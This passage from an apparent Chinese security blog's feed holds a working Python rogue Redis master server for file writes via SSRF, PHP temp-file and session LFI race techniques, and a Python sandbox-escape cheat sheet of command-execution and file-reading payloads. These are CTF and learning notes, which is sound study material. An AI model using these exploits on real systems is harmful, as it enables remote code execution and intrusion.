class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">CLRF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author: hosch3n</span></span><br><span class="line"><span class="string">Reference: https://github.com/r35tart/RedisWriteFile/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;*&quot;</span>):</span><br><span class="line">        raw_arr = cmd.strip().split(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> raw_arr[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;$&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> cmd.split(<span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> cmd.strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">msg</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[1;32;40m[info]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">din</span>(<span class="params">sock, cnt=<span class="number">4096</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    msg = sock.recv(cnt)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line">    <span class="keyword">return</span> msg.decode(<span class="string">&#x27;gb18030&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dout</span>(<span class="params">sock, msg</span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    <span class="keyword">if</span> type(msg) != bytes:</span><br><span class="line">        msg = msg.encode()</span><br><span class="line">    sock.send(msg)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RogueServer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lhost, lport</span>):</span></span><br><span class="line">        self._host = lhost</span><br><span class="line">        self._port = lport</span><br><span class="line">        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self._sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, self._port))</span><br><span class="line">        self._sock.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        cmd_arr = decode_cmd(data)</span><br><span class="line">        resp = <span class="string">&quot;&quot;</span></span><br><span class="line">        phase = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PING&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+PONG&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;REPLCONF&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+OK&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PSYNC&quot;</span>) <span class="keyword">or</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;SYNC&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;Z&quot;</span>*<span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CLRF</span><br><span class="line">            resp += <span class="string">&quot;$&quot;</span> + str(len(payload)) + CLRF</span><br><span class="line">            resp = resp.encode()</span><br><span class="line">            resp += payload + CLRF.encode()</span><br><span class="line">            phase = <span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> resp, phase</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self</span>):</span></span><br><span class="line">        cli, addr = self._sock.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = din(cli, <span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            resp, phase = self.handle(data)</span><br><span class="line">            dout(cli, resp)</span><br><span class="line">            <span class="keyword">if</span> phase == <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runserver</span>(<span class="params">lhost, lport</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rogue = RogueServer(lhost, lport)</span><br><span class="line">        rogue.exp()</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        rogue.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[1;31;m[-]\033[0m 发生错误！ : &#123;&#125; \n[*] Exit..&quot;</span>.format(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lhost&quot;</span>, dest=<span class="string">&quot;lh&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server ip&quot;</span>, metavar=<span class="string">&quot;LOCAL_HOST&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lp&quot;</span>, type=<span class="string">&quot;int&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server listen port, default 6379&quot;</span>, default=<span class="number">6379</span>,</span><br><span class="line">            metavar=<span class="string">&quot;LOCAL_PORT&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lfile&quot;</span>, dest=<span class="string">&quot;lfile&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;Local file that needs to be written&quot;</span>, metavar=<span class="string">&quot;Local_File_Name&quot;</span>, default=<span class="string">&#x27;dump.rdb&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--verbose&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, default=<span class="literal">False</span>,</span><br><span class="line">            help=<span class="string">&quot;Show full data stream&quot;</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">global</span> verbose, payload, filename</span><br><span class="line">    localfile = options.lfile</span><br><span class="line">    verbose = options.verbose</span><br><span class="line">    payload = open(localfile, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        runserver(options.lh, options.lp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        info(repr(e))</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA">一次“SSRF–&gt;RCE”的艰难利用</a></p><p><a href="https://www.anquanke.com/post/id/181599#h2-2">浅析SSRF认证攻击Redis</a></p><p><a href="http://r3start.net/index.php/2020/05/09/683">通过 SSRF 操作 Redis 主从复制写 Webshell</a></p><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p><p><a href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/">2020 GACTF web</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;用dict协议通过SSRF间接打Redis的时候，数据中存在&lt;code&gt;:&lt;/code&gt;、&lt;code&gt;&amp;#39;&lt;/code&gt;等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。&lt;/p&gt;
&lt;h2 id=&quot;位运算&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="redis" scheme="https://hosch3n.github.io/tags/redis/"/>
    
    <category term="bitop" scheme="https://hosch3n.github.io/tags/bitop/"/>
    
    <category term="slaveof" scheme="https://hosch3n.github.io/tags/slaveof/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含临时文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T09:54:48.000Z</published>
    <updated>2021-03-01T09:43:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在<code>$_FILES</code>变量中找到（通常为<code>/tmp/php[六个随机字符]</code>），通过phpinfo页面可以读到<code>$_FILES</code>。</p><p>一般的请求等获取到phpinfo中的文件名时已经结束了，此时可控的临时文件就已经被删掉了，但由于phpinfo中<code>$_FILES[file][tmp_name]</code>比其它HTTP头先输出，因此可以在HTTP头中发送大量无用数据，读到临时文件名后立即利用文件包含执行代码，通过条件竞争抢到临时文件被删除前时间窗口。</p><p><img src="/img/phpbhlswj_a.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在&lt;code&gt;$_FILES&lt;/code&gt;变量中找到（通常为&lt;code&gt;/tmp/php[六个随机字符]&lt;/code&gt;），通过phpinfo页面可以读到&lt;code&gt;$_FILES&lt;/co</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="lfi" scheme="https://hosch3n.github.io/tags/lfi/"/>
    
    <category term="tmp" scheme="https://hosch3n.github.io/tags/tmp/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含Session文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T06:35:12.000Z</published>
    <updated>2021-03-01T09:44:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>PHP的<code>session.save_path</code>配置指定了session文件的结构深度、文件权限、存放路径，格式为<code>N;MODE;/path</code>。<code>N</code>表示子文件夹划分深度，<code>MODE</code>表示文件的umask值（默认为600），<code>path</code>通常为<code>/var/lib/php/sessions</code>或<code>/tmp</code>。</p><p>PHP在大文件流式上传时，为了将上传进度存放在session中，如果不存在session则会自动初始化，直到文件上传结束后销毁（由<code>session.upload_progress.cleanup</code>指定）。当<code>session.upload_progress.enabled</code>为默认值1时，上传文件的同时传递<code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code>即可利用（由<code>session.upload_progress.name</code>指定）</p><p><code>session.name</code>通常为<code>PHPSESSID</code>，用作Cookie的键名。当<code>session.use_strict_mode</code>为默认值0时，客户端可以自定义sessionID，即通过Cookie传递<code>PHPSESSID=hosch3n</code>后，服务器将创建对应的<code>sess_hosch3n</code>文件。</p><p>因此就可以在利用文件上传自动初始化session的同时自定义sessionID，并利用条件竞争在文件上传完成前通过文件包含实现代码执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP的&lt;code&gt;session.save_path&lt;/code&gt;配置指定了session文件的结构深度、文件权限、存放路径，格式为&lt;code&gt;N;MODE;/path&lt;/code&gt;。&lt;code&gt;N&lt;/code&gt;表示子文件夹划分深度，&lt;code&gt;MODE&lt;/code&gt;表示</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="lfi" scheme="https://hosch3n.github.io/tags/lfi/"/>
    
    <category term="session" scheme="https://hosch3n.github.io/tags/session/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2020-08-27T13:02:57.000Z</published>
    <updated>2021-03-01T09:43:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。</p><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>Python导入模块时，会先判断<code>sys.modules</code>是否已经加载了该模块，如果没有加载则从<code>sys.path</code>中的目录按照模块名查找<code>py</code>、<code>pyc</code>、<code>pyd</code>文件，找到后执行该文件载入内存并添加至<code>sys.modules</code>中，再将模块名称导入Local命名空间。如果<code>a.py</code>中存在<code>import b</code>，则在<code>import a</code>时<code>ab</code>两个模块都会添加至<code>sys.modules</code>中，但仅将<code>a</code>导入Local命名空间。通过<code>from x import y</code>时，则将<code>x</code>添加至<code>sys.modules</code>中，将<code>y</code>导入Local命名空间。</p><p>因此除了常用方式，还可以通过手动添加、直接执行等方式导入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;xxx&#x27;</span>]=<span class="string">&#x27;blacklist&#x27;</span></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;xxx&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line">a = open(<span class="string">&#x27;/usr/lib/python3.8/xxx.py&#x27;</span>).read()</span><br><span class="line">exec(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/xxx.py&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="危险方法"><a href="#危险方法" class="headerlink" title="危险方法"></a>危险方法</h3><p>有很多模块和方法可以用于执行命令或者读取文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bdb.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cgi.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">importlib.__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pickle.loads(<span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span>)</span><br><span class="line"></span><br><span class="line">eval(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(compile(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">pty.spawn(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件操作</span></span><br><span class="line">open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">linecache.getlines(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line">codecs.open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">file(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">types.FileType(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">commands.getstatus(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数参数</span></span><br><span class="line">foo.__code__.co_argcount</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_argcount</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数字节码</span></span><br><span class="line">foo.__code__.co_code</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_code</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="重新导入"><a href="#重新导入" class="headerlink" title="重新导入"></a>重新导入</h2><p>Python将一些经常用到的函数放在了<code>内建模块</code>中，这些函数无需导入即可使用（比如<code>eval</code>、<code>open</code>），这个内建模块在Python2中叫作<code>__builtin__</code>、在Python3中叫作<code>builtins</code>，这两个都需要导入才可以引用，但可以通过<code>__builtins__</code>来间接引用而无需导入（有一点区别，但问题不大）。</p><p>一些环境出于安全考虑会删掉<code>内建模块</code>中的危险方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;getattr&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这时可以尝试重新导入<code>内建模块</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">imp.reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可用作首次导入</span></span><br></pre></td></tr></table></figure><p>但是Python2的<code>reload</code>也是内建模块，可以通过<code>del __builtins__.reload</code>删掉。</p><h2 id="构造逃逸链"><a href="#构造逃逸链" class="headerlink" title="构造逃逸链"></a>构造逃逸链</h2><p>对于<code>a</code>模块嵌套导入的<code>b</code>模块中导入的<code>xxx</code>模块，可以通过<code>a.b.xxx</code>的方式来引用。如果标准库中嵌套导入了危险模块则会成为一个潜在风险，但是标准库也是需要先导入才能用的，如何才能打破僵局让潜在风险可被利用呢？</p><p>在Python3中所有的类都默认继承自<code>object</code>类、继承<code>object</code>的全部方法，在Python2中类默认为<code>classobj</code>，只有<code>[&#39;__doc__&#39;, &#39;__module__&#39;]</code>两个方法，除非显式声明继承自<code>object</code>类。</p><p>思路一：如果<code>object</code>的某个派生类中存在危险方法，就可以直接拿来用</p><p>思路二：如果<code>object</code>的某个派生类导入了危险模块，就可以链式调用危险方法</p><p>思路三：如果<code>object</code>的某个派生类由于导入了某些标准库模块，从而间接导入了危险模块的危险方法，也可以通过链式调用</p><p>思路四：基本类型的某些方法属于特殊方法，可以通过链式调用</p><h3 id="获取object类"><a href="#获取object类" class="headerlink" title="获取object类"></a>获取object类</h3><p>Python建议类的protected类型、private类型及内部变量分别以<code>_xxx</code>、<code>__yyy</code>、<code>__zzz__</code>的形式命名，但这仅是一种代码风格规范，并未在语言层面作任何限制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">object</span><br><span class="line"></span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下标可以用负数来倒数</span></span><br></pre></td></tr></table></figure><h3 id="遍历派生类"><a href="#遍历派生类" class="headerlink" title="遍历派生类"></a>遍历派生类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 